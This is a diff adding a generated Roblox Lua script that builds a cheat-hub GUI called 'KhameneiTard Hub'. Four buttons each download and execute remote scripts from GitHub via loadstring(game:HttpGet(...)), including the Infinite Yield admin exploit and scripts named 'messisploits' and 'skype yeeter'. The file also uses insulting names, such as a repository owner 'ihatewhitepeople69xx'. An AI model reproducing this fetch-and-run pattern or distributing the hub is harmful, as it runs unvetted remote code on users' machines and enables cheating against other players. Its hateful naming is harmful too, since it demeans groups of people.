@@ -1,0 +1,240 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+local ImageLabel_4 = Instance.new("ImageLabel")
+local adminswag = Instance.new("TextButton")
+local sjype = Instance.new("TextButton")
+local messitoh = Instance.new("TextButton")
+local emote = Instance.new("TextButton")
+local sound = Instance.new("TextButton")
+local ImageLabel_5 = Instance.new("ImageLabel")
+local ImageLabel_6 = Instance.new("ImageLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 67, 167)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0960134119, 0, 0.195460275, 0)
+Frame.Size = UDim2.new(0, 1007, 0, 520)
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.412115186, 0, 0, 0)
+ImageLabel.Size = UDim2.new(0, 592, 0, 133)
+ImageLabel.Image = "rbxassetid://2781956525"
+
+ImageLabel_2.Parent = Frame
+ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_2.BorderSizePixel = 0
+ImageLabel_2.Position = UDim2.new(0, 0, 0.255769223, 0)
+ImageLabel_2.Size = UDim2.new(0, 415, 0, 387)
+ImageLabel_2.Image = "rbxassetid://10277881347"
+
+ImageLabel_3.Parent = Frame
+ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_3.BorderSizePixel = 0
+ImageLabel_3.Size = UDim2.new(0, 415, 0, 133)
+ImageLabel_3.Image = "rbxassetid://569819347"
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.106626056, 0, 0.0945775509, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.Unknown
+TextLabel.Text = "KhameneiTard Hub"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 20.000
+
+UICorner.CornerRadius = UDim.new(0, 30)
+UICorner.Parent = Frame
+
+ImageLabel_4.Parent = Frame
+ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_4.BackgroundTransparency = 1.000
+ImageLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_4.BorderSizePixel = 0
+ImageLabel_4.Position = UDim2.new(0.905660391, 0, 0.413461536, 0)
+ImageLabel_4.Size = UDim2.new(0, 78, 0, 157)
+ImageLabel_4.Image = "rbxassetid://145722020"
+
+adminswag.Name = "admin swag"
+adminswag.Parent = Frame
+adminswag.BackgroundColor3 = Color3.fromRGB(28, 202, 255)
+adminswag.BorderColor3 = Color3.fromRGB(0, 0, 0)
+adminswag.BorderSizePixel = 0
+adminswag.Position = UDim2.new(0.436941415, 0, 0.317307681, 0)
+adminswag.Size = UDim2.new(0, 200, 0, 50)
+adminswag.Font = Enum.Font.Unknown
+adminswag.Text = "super swag admin"
+adminswag.TextColor3 = Color3.fromRGB(0, 0, 0)
+adminswag.TextSize = 14.000
+
+sjype.Name = "sjype"
+sjype.Parent = Frame
+sjype.BackgroundColor3 = Color3.fromRGB(28, 202, 255)
+sjype.BorderColor3 = Color3.fromRGB(0, 0, 0)
+sjype.BorderSizePixel = 0
+sjype.Position = UDim2.new(0.436941415, 0, 0.451923072, 0)
+sjype.Size = UDim2.new(0, 200, 0, 50)
+sjype.Font = Enum.Font.Unknown
+sjype.Text = "skype"
+sjype.TextColor3 = Color3.fromRGB(0, 0, 0)
+sjype.TextSize = 14.000
+
+messitoh.Name = "messi toh"
+messitoh.Parent = Frame
+messitoh.BackgroundColor3 = Color3.fromRGB(28, 202, 255)
+messitoh.BorderColor3 = Color3.fromRGB(0, 0, 0)
+messitoh.BorderSizePixel = 0
+messitoh.Position = UDim2.new(0.436941415, 0, 0.59807694, 0)
+messitoh.Size = UDim2.new(0, 200, 0, 50)
+messitoh.Font = Enum.Font.Unknown
+messitoh.Text = "messi toh"
+messitoh.TextColor3 = Color3.fromRGB(0, 0, 0)
+messitoh.TextSize = 14.000
+
+emote.Name = "emote"
+emote.Parent = Frame
+emote.BackgroundColor3 = Color3.fromRGB(28, 202, 255)
+emote.BorderColor3 = Color3.fromRGB(0, 0, 0)
+emote.BorderSizePixel = 0
+emote.Position = UDim2.new(0.436941415, 0, 0.744230747, 0)
+emote.Size = UDim2.new(0, 200, 0, 50)
+emote.Font = Enum.Font.Unknown
+emote.Text = "emote"
+emote.TextColor3 = Color3.fromRGB(0, 0, 0)
+emote.TextSize = 14.000
+
+sound.Name = "sound"
+sound.Parent = Frame
+sound.BackgroundColor3 = Color3.fromRGB(28, 202, 255)
+sound.BorderColor3 = Color3.fromRGB(0, 0, 0)
+sound.BorderSizePixel = 0
+sound.Position = UDim2.new(0.673286974, 0, 0.390384614, 0)
+sound.Size = UDim2.new(0, 200, 0, 180)
+sound.Font = Enum.Font.Unknown
+sound.Text = ""
+sound.TextColor3 = Color3.fromRGB(0, 0, 0)
+sound.TextSize = 19.000
+
+ImageLabel_5.Parent = Frame
+ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_5.BorderSizePixel = 0
+ImageLabel_5.Position = UDim2.new(1.37, 0, -2.79999995, 0)
+ImageLabel_5.Size = UDim2.new(0, 100, 0, 100)
+ImageLabel_5.Image = "rbxassetid://133273137237894"
+
+ImageLabel_6.Parent = Frame
+ImageLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_6.BackgroundTransparency = 1.000
+ImageLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_6.BorderSizePixel = 0
+ImageLabel_6.Position = UDim2.new(0.703078449, 0, 0.440384626, 0)
+ImageLabel_6.Size = UDim2.new(0, 139, 0, 128)
+ImageLabel_6.Image = "rbxassetid://133273137237894"
+
+-- Scripts:
+
+local function QIIJ_fake_script() -- adminswag.LocalScript 
+	local script = Instance.new('LocalScript', adminswag)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+end
+coroutine.wrap(QIIJ_fake_script)()
+local function YCRUEJR_fake_script() -- sjype.LocalScript 
+	local script = Instance.new('LocalScript', sjype)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/ihatewhitepeople69xx-ship-it/sdadasdasdsa/refs/heads/main/skype%20yeeter'))()
+	end)
+end
+coroutine.wrap(YCRUEJR_fake_script)()
+local function MPLAZKG_fake_script() -- messitoh.LocalScript 
+	local script = Instance.new('LocalScript', messitoh)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/ihatewhitepeople69xx-ship-it/sdadasdasdsa/refs/heads/main/messisploits'))()
+	end)
+end
+coroutine.wrap(MPLAZKG_fake_script)()
+local function BIPN_fake_script() -- emote.LocalScript 
+	local script = Instance.new('LocalScript', emote)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FEEGGEG/refs/heads/main/%5BFE%5D%20Energize%20Animation%20Gui.txt'))()
+	end)
+end
+coroutine.wrap(BIPN_fake_script)()
+local function XQXK_fake_script() -- sound.LocalScript 
+	local script = Instance.new('LocalScript', sound)
+
+	local button = script.Parent
+	local sound = button:WaitForChild("Sound")
+	
+	button.MouseButton1Click:Connect(function()
+		sound:Play()
+	end)
+end
+coroutine.wrap(XQXK_fake_script)()
+local function EZOBM_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	local user = game:GetService("UserInputService")
+	local screengui = script.Parent
+	local frame = screengui.Frame
+	local star = game:GetService("StarterGui")
+	
+	local toggle = Enum.KeyCode.K
+	
+	local function onInput(input, gameProcessed)
+		if gameProcessed then return end
+		if input.KeyCode == toggle then
+			frame.Visible = not frame.Visible
+		end
+	end
+	
+	local StarterGui = game:GetService("StarterGui")
+	
+	star:SetCore("SendNotification", {
+		Title = "from iran with love",
+		Text = "press K to toggle GUI",
+		Icon = "rbxassetid://2781956530", 
+		Duration = 5
+	})
+	
+	user.InputBegan:Connect(onInput)
+end
+coroutine.wrap(EZOBM_fake_script)()
